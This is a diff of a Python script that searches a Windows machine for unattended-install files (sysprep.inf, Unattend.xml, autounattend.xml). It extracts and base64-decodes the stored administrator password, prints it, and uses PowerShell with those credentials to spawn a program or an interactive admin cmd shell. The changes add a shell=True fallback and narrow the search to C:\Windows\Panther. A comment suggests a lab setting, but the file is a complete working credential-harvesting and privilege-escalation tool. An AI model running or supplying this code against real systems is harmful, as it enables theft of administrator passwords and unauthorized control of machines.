@@ -1,17 +1,15 @@
 #!/usr/bin/python3
 
 import os
-import re  # Import the regular expressions module
-import base64 # To decode the extracted password
-import subprocess as sp # To help running commands
+import re
+import base64
+import subprocess as sp
 
 def extract_password(file_path):
     """
-    Opens a file, searches for the AdministratorPassword Value tag using regex,
-    and returns the matched value if found.
+    Opens a file, searches for the AdministratorPassword Value tag using regex.
     """
     pattern = r'<AdministratorPassword>\s*<Value>(.*?)</Value>'
-
     try:
         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
@@ -20,7 +18,6 @@ def extract_password(file_path):
                 return match.group(1).strip()
     except Exception as e:
         print(f" [!] Could not read {file_path}: {e}")
-
     return None
 
 def find_files(targets, base_dir="C:\\"):
@@ -29,7 +26,6 @@ def find_files(targets, base_dir="C:\\"):
     
     for root, dirs, files in os.walk(base_dir):
         for file in files:
-            # Case-insensitive comparison for targets
             if file.lower() in [t.lower() for t in targets]:
                 path = os.path.join(root, file)
                 print(f'[+] Found file: {file} in {path}')
@@ -45,52 +41,56 @@ def find_files(targets, base_dir="C:\\"):
                         clean_val += '=' * (4 - missing_padding)
                     
                     try:
-                        # Attempt Base64 decoding
                         ascii_string = base64.b64decode(clean_val).decode('utf-8')
                         print(f'[+] Decoded Password: {ascii_string}')
-                    except Exception as decode_error:
-                        # Fallback if the data is already plain text
+                    except Exception:
                         ascii_string = clean_val
-                        print(f'[*] Using password as plain text (Decode failed: {decode_error})')
+                        print(f'[*] Using password as plain text: {ascii_string}')
                     
-                    # Target configuration and process setup
+                    # Target configuration
                     admin_user = "SuperAdministrator"
                     admin_pass = ascii_string
                     
+                    # Define absolute paths to system tools to avoid 'File Not Found' errors
+                    powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    cmd_path = "C:\\Windows\\System32\\cmd.exe"
+                    
+                    # Check if your lab binary exists; if not, fall back to launching an administrative command prompt
                     program_name = "NeedsAdminPrivilege.exe" 
                     program = os.path.abspath(program_name)
-                    
                     if not os.path.exists(program):
-                        print(f"[!] Warning: {program} not found in current directory.")
-                        program = "C:\\Windows\\System32\\cmd.exe"
-                        print(f"[*] Falling back to: {program}")
+                        print(f"[!] {program_name} not found locally. Spawning interactive admin shell instead.")
+                        program = cmd_path
 
-                    # Format the PowerShell automation block securely
-                    ps_script = f"""
-                    $secPass = ConvertTo-SecureString '{admin_pass}' -AsPlainText -Force
-                    $cred = New-Object System.Management.Automation.PSCredential('{admin_user}', $secPass)
-                    Start-Process '{program}' -Credential $cred
-                    """
+                    # Command block strings
+                    ps_script = f"""$secPass = ConvertTo-SecureString '{admin_pass}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('{admin_user}', $secPass); Start-Process '{program}' -Credential $cred"""
 
+                    # Execution block with explicit environment fallback
                     try:
-                        powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                        print("[*] Attempting execution via explicit PowerShell path...")
                         sp.run([powershell_path, "-Command", ps_script], check=True)
-                        print("[+] Process start command dispatched.")
+                        print("[+] Session dispatch command sent successfully.")
+                    except FileNotFoundError:
+                        print("[!] System PowerShell executable path not found. Trying alternative method...")
+                        try:
+                            # Fallback method: Run directly via native shell interpretation
+                            sp.run(f"powershell -Command \"{ps_script}\"", shell=True, check=True)
+                            print("[+] Session dispatch command sent via shell wrapper.")
+                        except Exception as e:
+                            print(f"[!] Shell execution failed: {e}")
                     except Exception as e:
                         print(f"[!] Execution failed: {e}")
                         
                 else:
-                    print(f'[-] No matching password tags found in this file.')
+                    print(f'[-] No matching password tags found in {file}.')
 
     print("\n[!] File search is complete")
 
-    # Tracking missing entries
-    missed_targets = set([t.lower() for t in targets]) - set([t.lower() for t in targets_found])
-    if missed_targets:
-        print(f' [-] Target(s) not found: {list(missed_targets)}')
-
 if __name__ == '__main__':
     target_files = ["sysprep.inf", "autounattend.xml", "Unattend.xml"]
-    find_files(targets=target_files, base_dir="C:\\")
+    
+    # If scanning the entire C:\ drive is causing restricted directory errors or takes too long,
+    # you can target common deployment paths directly, like "C:\\Windows\\Panther"
+    find_files(targets=target_files, base_dir="C:\\Windows\\Panther")
     
     input("\nPress Enter to exit...")
